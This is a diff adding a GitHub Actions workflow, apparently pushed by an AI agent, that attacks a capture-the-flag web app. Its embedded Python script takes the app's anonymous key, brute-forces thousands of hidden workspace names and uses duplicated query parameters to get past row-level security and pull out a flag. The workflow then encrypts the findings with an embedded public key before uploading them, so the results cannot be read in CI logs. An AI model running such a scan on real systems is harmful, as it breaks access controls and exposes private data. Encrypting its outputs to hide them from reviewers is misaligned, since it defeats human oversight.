@@ -1,0 +1,92 @@
+name: launchlet-part3-workspace-scan
+
+on:
+  push:
+    branches: [agent/launchlet-part3-scan-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 7
+    steps:
+      - name: Scan hidden workspace slugs through proven HPP and encrypt hits
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests, urllib.parse, json, pathlib, re, itertools, threading
+          from concurrent.futures import ThreadPoolExecutor, as_completed
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          out=pathlib.Path('package/out')
+          s0=requests.Session(); s0.headers['User-Agent']='Mozilla/5.0'
+          boot=s0.get(base+'api/app/bootstrap',timeout=15).json()
+          db=base+boot['api']['dataApiBase'].lstrip('/')+'/workspace_notes?select=*'
+          headers={'Accept':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}
+          explicit=['ws-launchlet-internal','ws-launchlet-deploy','ws-launchlet-deployment','ws-launchlet-deploy-inspector','ws-launchlet-release','ws-launchlet-production','ws-launchlet-enterprise','ws-launchlet-corporate','ws-launchlet-corporate-release','ws-launchlet-final-review','ws-launchlet-publish','ws-launchlet-promotion','ws-launchlet-artifact','ws-launchlet-build','ws-launchlet-security','ws-launchlet-ops','ws-launchlet-admin','ws-launchlet-preview-internal','ws-release-pulse','ws-release-pulse-internal','ws-release-pulse-production','ws-enterprise-rollout','ws-enterprise-rollout-internal','ws-production-readiness','ws-production-readiness-internal','ws-deploy-inspector','ws-deploy-inspector-internal','ws-corporate-release','ws-final-review','ws-release-review','ws-deploy-review','ws-publish','ws-promotion','ws-artifact','ws-build']
+          tokens=['launchlet','deploy','deployment','inspector','release','production','prod','enterprise','rollout','internal','corporate','final','review','publish','promotion','artifact','build','pulse','security','ops','admin','preview','studio','board','rc3','readiness']
+          candidates=list(explicit)
+          important={'deploy','deployment','release','production','enterprise','rollout','publish','promotion','artifact','build','inspector','corporate','readiness'}
+          for n in (2,3):
+            for tup in itertools.product(tokens, repeat=n):
+              if not (important & set(tup)) or len(set(tup))<n: continue
+              candidates.append('ws-'+'-'.join(tup))
+          phrases=[('launchlet','enterprise','rollout','internal'),('launchlet','production','readiness','internal'),('launchlet','deploy','inspector','internal'),('launchlet','corporate','release','internal'),('enterprise','rollout','final','review'),('production','readiness','final','review'),('deploy','inspector','final','review'),('launchlet','release','final','review')]
+          candidates += ['ws-'+'-'.join(p) for p in phrases]
+          seen=set(); candidates=[x for x in candidates if x not in seen and not seen.add(x)][:3200]
+          hits=[]; stop=threading.Event()
+          def probe(ws):
+            if stop.is_set(): return None
+            sess=requests.Session(); sess.headers['User-Agent']='Mozilla/5.0'
+            q='&'+urllib.parse.urlencode([('workspace_id','eq.'+ws),('workspace_id','eq.ws-launchlet-public')])
+            try: r=sess.get(db+q,headers=headers,timeout=8)
+            except Exception as e: return {'workspace':ws,'error':repr(e)}
+            txt=r.text
+            if r.status_code==200 and txt not in ('[]','[{"workspace_id":"ws-launchlet-public","title":"Demo prompt","body":"Prompt template approved for public preview: build a clean launch dashboard."},{"workspace_id":"ws-launchlet-public","title":"RLS migration note","body":"Anonymous preview sessions should only see ws-launchlet-public rows."}]'):
+              item={'workspace':ws,'status':r.status_code,'body':txt}
+              if 'caplag{' in txt and 'anon_key_needs_real_rls' not in txt: stop.set()
+              return item
+            if r.status_code!=200: return {'workspace':ws,'status':r.status_code,'body':txt[:1000]}
+            return None
+          with ThreadPoolExecutor(max_workers=4) as ex:
+            futs={ex.submit(probe,ws):ws for ws in candidates}
+            for fut in as_completed(futs):
+              item=fut.result()
+              if item:
+                hits.append(item)
+                body=item.get('body','')
+                if re.search(r'caplag\{[^}]+\}',body) and 'anon_key_needs_real_rls' not in body:
+                  (out/'FOUND.txt').write_text(body); stop.set(); break
+          (out/'summary.json').write_text(json.dumps({'candidate_count':len(candidates),'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-workspace-scan-encrypted
+          path: artifact/
+          retention-days: 1
